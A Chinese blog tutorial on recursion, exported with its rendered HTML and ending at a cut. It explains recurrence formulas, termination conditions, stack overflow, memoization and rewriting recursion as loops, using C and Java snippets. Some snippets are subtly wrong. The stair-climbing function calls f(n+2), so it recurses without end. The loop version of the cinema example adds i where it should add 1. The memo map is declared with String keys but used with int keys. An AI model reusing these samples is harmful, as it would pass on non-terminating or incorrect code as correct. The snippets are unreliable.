%}\n</div>\n\n从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是**动态规划**，另一个就是**递归**。\n\n递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。\n\n不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。\n\n比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？\n\n这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。\n\n这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的\n\n$$ f(n) = f(n-1) +1 ;\\\\ 其中f(1)=1 $$\n\nf(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：\n```C\nint f(int n){\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 什么时候可以用递归呢\n{% endnote %}\n</div>\n\n刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。\n\n**1、一个问题的解可以分解为几个子问题的解**\n\n何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为\"前一排的人在那一排？\"这样一个子问题。\n\n**2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样**\n\n还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。\n\n**3、存在递归终止条件**\n\n把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何写递归代码\n{% endnote %}\n</div>\n\n说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\">**写出递推公式，找到终止条件**</font>，剩下将递推公式转化为代码就很容易了。\n\n我这里举个例子，来一步一步实现递归代码。\n\n> 如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？\n\n如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？\n\n我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：\n$$f(n) = f(n-1) + f(n-2) $$\n\n有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。\n\nn=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。\n\n所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。\n\n我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：\n$$ f(n) = f(n-1) + f(n-2); \\\\ 其中 \\\\ f(1)=1, f(2)=2; $$\n\n有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：\n```C\nint f(int n) {\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\treturn f(n-1)+f(n+2);\n}\n```\n\n总结一下，<font color=\"red\">**写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。**</font>\n\n讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。\n\n上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。\n\n但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。\n\n像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个\"递\"和\"归\"的过程一步一步都想清楚。\n\n计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。\n\n对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？\n\n如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。\n\n因此，编写递归代码的关键是，**只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤**\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕堆栈溢出\n{% endnote %}\n</div>\n\n在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？\n\n在\"栈\"那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。\n\n比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：\n```java\nException in thread \"main\" java.lang.StackOverflowError\n```\n\n那么如何避免堆栈溢出呢？\n\n我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n<=0。\n\n```C\n// 表示递归的深度\nint depth = 0;\nint f(int n){\n\t++depth;\n\tif(depth>1000)throw exception;\n\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕重复计算\n{% endnote %}\n</div>\n\n除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：\n{% asset_img 台阶递归图.jpg %}\n\n从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。\n\n为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。\n\n按照上面的思路，我们再来改造一下代码：\n```java\nMap<String, Integer> map = new Hashmap<>();\npublic static int f(int n){\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\tif(map.containsKey(n)){\n\t\treturn map.get(n);\n\t}\n\tint ret = f(n-1) + f(n-2);\n\tmap.put(n, ret);\n\treturn ret;\n}\n```\n\n除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。\n\n在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 怎样将递归代码改写为非递归代码\n{% endnote %}\n</div>\n\n我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。\n\n那我们是否可以将递归代码改写为非递归代码呢？\n\n仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：\n```C\nint f(int n){\n\tint ret = 1;\n\tfor(int i=2; i<=n; ++i){\n\t\tret = ret+i;\n\t}\n\treturn ret;\n}\n```\n\n同样，第二个例子也可以改写为非递归的方式实现。\n\n```C\nint f(int n){\n\tif(n==1)return 1;\n\tif(n==2)return 2;\n\n\tint ret = 0;\n\tint prepre = 1; // f(1)=1\n\tint pre = 2;    // f(2)=2\n\tfor(int i=3;i<=n;++i){ //f(3) = f(2)+f(1)\n\t\tret = pre + prepre;\n\t\tprepre = pre;\n\t\tpre = ret;\n\t}\n\treturn ret;\n}\n```\n\n那是不是所有的递归代码都可以改写为这种**迭代循环**的非递归写法呢？\n\n笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。\n\n但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：\n\n```java\nlong findRootRefererId(long actorId){\n\tlong refererId = select referer_id from [table] where actor_id = actorId;\n\tif(refererId == null) return actorId;\n\treturn findRootRefererId(refererId)\n}\n```\n\n是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。\n\n第一，如果递归很深，可能会有堆栈溢出问题。\n\n第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。\n\n不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。\n\n递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。\n\n\n### 思考题\n\n1、 递归代码的时间复杂度该如何分析？\n\n2、 递归代码如何调试呢？你有什么好的调试方法吗？\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-递归","published":1,"updated":"2019-06-26T03:52:03.528Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mt0053o25t3tf6enwv","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。</p>\n<p>一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。</p>\n<table>\n<thead>\n<tr>\n<th>actor_id</th>\n<th>referer_id</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>B</td>\n<td>A</td>\n</tr>\n<tr>\n<td>C</td>\n<td>B</td>\n</tr>\n</tbody>\n</table>\n<p>基于这个背景，我的问题是，<font color=\"red\"><strong>给定一个用户ID，如何查找这个用户的“最终推荐人”？</strong></font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解递归\"><a href=\"#如何理解递归\" class=\"headerlink\" title=\"如何理解递归\"></a>如何理解递归</h3></div><br></div>\n\n<p>从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是<strong>动态规划</strong>，另一个就是<strong>递归</strong>。</p>\n<p>递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。</p>\n<p>不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。</p>\n<p>比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？</p>\n<p>这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。</p>\n<p>这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的</p>\n<p>$$ f(n) = f(n-1) +1 ;\\ 其中f(1)=1 $$</p>\n<p>f(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"什么时候可以用递归呢\"><a href=\"#什么时候可以用递归呢\" class=\"headerlink\" title=\"什么时候可以用递归呢\"></a>什么时候可以用递归呢</h3></div><br></div>\n\n<p>刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。</p>\n<p><strong>1、一个问题的解可以分解为几个子问题的解</strong></p>\n<p>何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为”前一排的人在那一排？”这样一个子问题。</p>\n<p><strong>2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样</strong></p>\n<p>还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。</p>\n<p><strong>3、存在递归终止条件</strong></p>\n<p>把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何写递归代码\"><a href=\"#如何写递归代码\" class=\"headerlink\" title=\"如何写递归代码\"></a>如何写递归代码</h3></div><br></div>\n\n<p>说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\"><strong>写出递推公式，找到终止条件</strong></font>，剩下将递推公式转化为代码就很容易了。</p>\n<p>我这里举个例子，来一步一步实现递归代码。</p>\n<blockquote>\n<p>如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？</p>\n</blockquote>\n<p>如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？</p>\n<p>我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：<br>$$f(n) = f(n-1) + f(n-2) $$</p>\n<p>有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。</p>\n<p>n=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。</p>\n<p>所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。</p>\n<p>我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：<br>$$ f(n) = f(n-1) + f(n-2); \\ 其中 \\ f(1)=1, f(2)=2; $$</p>\n<p>有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+f(n+<span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>总结一下，<font color=\"red\"><strong>写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。</strong></font></p>\n<p>讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。</p>\n<p>上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。</p>\n<p>但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。</p>\n<p>像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个”递”和”归”的过程一步一步都想清楚。</p>\n<p>计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。</p>\n<p>对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？</p>\n<p>如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。</p>\n<p>因此，编写递归代码的关键是，<strong>只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤</strong></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕堆栈溢出\"><a href=\"#递归代码警惕堆栈溢出\" class=\"headerlink\" title=\"递归代码警惕堆栈溢出\"></a>递归代码警惕堆栈溢出</h3></div><br></div>\n\n<p>在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？</p>\n<p>在”栈”那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。</p>\n<p>比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">\"main\"</span> java.lang.StackOverflowError</span><br></pre></td></tr></table></figure></p>\n<p>那么如何避免堆栈溢出呢？</p>\n<p>我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n&lt;=0。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 表示递归的深度</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> depth = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t++depth;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(depth&gt;<span class=\"number\">1000</span>)<span class=\"keyword\">throw</span> exception;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕重复计算\"><a href=\"#递归代码警惕重复计算\" class=\"headerlink\" title=\"递归代码警惕重复计算\"></a>递归代码警惕重复计算</h3></div><br></div>\n\n<p>除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：<br><img src=\"/posts/2018-09-18-算法-递归/台阶递归图.jpg\"></p>\n<p>从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。</p>\n<p>为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。</p>\n<p>按照上面的思路，我们再来改造一下代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String, Integer&gt; map = <span class=\"keyword\">new</span> Hashmap&lt;&gt;();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(map.containsKey(n))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> map.get(n);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = f(n-<span class=\"number\">1</span>) + f(n-<span class=\"number\">2</span>);</span><br><span class=\"line\">\tmap.put(n, ret);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。</p>\n<p>在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"怎样将递归代码改写为非递归代码\"><a href=\"#怎样将递归代码改写为非递归代码\" class=\"headerlink\" title=\"怎样将递归代码改写为非递归代码\"></a>怎样将递归代码改写为非递归代码</h3></div><br></div>\n\n<p>我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。</p>\n<p>那我们是否可以将递归代码改写为非递归代码呢？</p>\n<p>仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">2</span>; i&lt;=n; ++i)&#123;</span><br><span class=\"line\">\t\tret = ret+i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>同样，第二个例子也可以改写为非递归的方式实现。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span 